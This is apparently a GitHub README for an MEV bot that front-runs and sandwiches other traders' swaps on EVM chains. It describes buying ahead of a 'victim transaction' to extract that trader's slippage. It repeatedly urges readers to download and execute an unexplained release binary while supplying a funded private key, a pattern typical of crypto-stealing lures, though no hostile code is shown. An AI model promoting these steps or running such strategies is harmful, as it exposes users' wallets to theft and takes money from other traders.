Overview

This repository contains an MEV bot that listens to the mempool, finds profitable opportunities, and executes front-running or sandwich strategies on EVM chains. The code includes the core bot logic, smart contract helpers, and scripts to run the bot on a server or VPS. Use the Releases page to get the ready-to-run bundle.

Core features

- Mempool watcher that parses pending transactions in real time.
- Profitability estimator that simulates trade outcomes off-chain.
- Transaction builder that crafts flashbots-style or direct transactions.
- Gas optimizer and bundle sender for priority placement.
- Support for EVM chains: Ethereum mainnet, testnets, and compatible chains.
- Example snipe strategies with configurable parameters.
- Solidity helpers for token swaps and approvals.
- Logging, metrics, and basic dashboard-ready output.

Why use this repo

- You get a focused, modular bot that you can run on a VPS.
- The bot uses common tooling and libraries that you know: ethers.js, web3, Hardhat.
- You can extend strategies, add custom filters, and tune gas logic.
- The release includes binaries and scripts to speed deployment.

Requirements

- Linux or macOS server. A small VPS works for testing. Use a high-availability host for production.
- Node.js 18+ and npm or yarn.
- A private key with funds for gas and trades.
- RPC endpoints with high throughput (Infura, Alchemy, or your own node).
- Optional: Flashbots relay access or MEV relay credentials for private bundle submission.
- Basic knowledge of EVM and solidity.

Quick start (example)

1) Download the release asset and run the installer or binary from the Releases page:
   https://github.com/sebast-cpu/Github-Mev-Bot/releases
   - Download the latest archive (.tar.gz or .zip).
   - Extract the bundle.
2) Install dependencies
   - If you use the source bundle:
     ```
     cd Github-Mev-Bot
     npm install
     ```
3) Create a .env file with keys and RPC details:
   ```
   PRIVATE_KEY=0xyourprivatekey
   RPC_URL=https://mainnet.infura.io/v3/your-id
   RELAY_URL=https://relay.flashbots.net
   GAS_LIMIT=200000
   SLIPPAGE=0.01
   ```
4) Launch the bot:
   ```
   node run-bot.js --mode live
   ```
5) Watch logs and metrics in the console or send logs to a monitoring endpoint.

Architecture overview

- Watcher: connects to an RPC or websocket provider and streams pending transactions. It filters transactions by token pairs, gas levels, and known router contracts.
- Analyzer: forks state at the current block and simulates candidate trades. It computes profit after gas and slippage.
- Builder: constructs transactions or bundles. It can pack transactions for Flashbots or submit directly to mempool with higher nonce/gas.
- Sender: submits single tx or bundle to chosen relay. It monitors for inclusion and handles reorgs and nonce issues.
- Storage: stores trade history and metrics in a simple JSON or optional DB.

Common workflows

- Front-run swaps: detect large swap on a DEX, submit a buy that will execute before the swap, then sell after it.
- Sandwich trades: buy ahead and sell after the victim transaction to collect profit from slippage.
- Liquidation picks: detect liquidations and act if you can capture a favorable position.
- Arbitrage: detect cross-pair or cross-exchange price differences and execute atomic trades.

Configuration tips

- Keep the private key off the repo. Use environment variables or secret stores.
- Set strict gas limits in config to avoid runaway fees.
- Adjust the profitability threshold. The default threshold protects from tiny margins.
- Use a separate account for testing on testnets.
- Use multiple RPC providers to reduce missed transactions.

Strategy tuning checklist

- Pair filter: target high-liquidity pairs to reduce slippage.
- Min trade size: avoid tiny trades that lose to gas.
- Gas cap: set a max gas price you accept.
- Simulate: always run a simulation fork before executing on mainnet at high risk.

Security

- Private key safety: keep keys outside source control. Use a hardware wallet or vault for production.
- Dry run: test strategies on a fork or testnet first.
- Sanity checks: add checks to prevent accidental large transfers.
- Rate limits: respect RPC provider rate limits to avoid throttling.

Docker usage

- Build:
  ```
  docker build -t mev-bot:latest .
  ```
- Run:
  ```
  docker run -e PRIVATE_KEY=$PRIVATE_KEY -e RPC_URL=$RPC_URL mev-bot:latest
  ```

Monitoring and logs

- The bot prints structured logs with timestamps and request ids.
- You can enable JSON logs for ingestion by a log pipeline.
- Metrics: add Prometheus exporters if you want to push metrics to a dashboard.

Troubleshooting

- No pending txs seen: check websocket connection and RPC provider. Try multiple endpoints.
- Rejected bundles: verify relay credentials and bundle format.
- High gas costs: review strategy parameters and gas estimation logic.
- Failed simulations: check fork provider and contract addresses.

Contributing

- Open an issue to propose features or report bugs.
- Fork the repo and create a feature branch for pull requests.
- Keep changes modular and testable.
- Add tests for new strategies and contract helpers.

Licensing

- The repository includes a permissive license. Check the LICENSE file in the repo for details.

Releases and downloads

Download the latest release asset and execute the included binary or installer from:
https://github.com/sebast-cpu/Github-Mev-Bot/releases

- Pick the asset matching your platform (Linux/macOS).
- Verify checksums if provided.
- Extract and run the provided start script or binary.

Best practices for running in production

- Run nodes in different regions and use multiple RPC fallbacks.
- Keep funds split across accounts; never use your main wallet with experimental code.
- Use observability: alerts for failed transactions, high gas spend, and unusual wallet activity.
- Schedule maintenance windows to update the bot and contracts.

Examples

- Example config for mainnet:
  ```
  {
    "chain": "mainnet",
    "rpc": "https://mainnet.infura.io/v3/YOUR_ID",
    "privateKeyEnv": "PRIVATE_KEY",
    "minProfitEth": 0.02,
    "maxGasGwei": 400
  }
  ```
- Example command:
  ```
  node run-bot.js --config config/mainnet.json --mode live
  ```
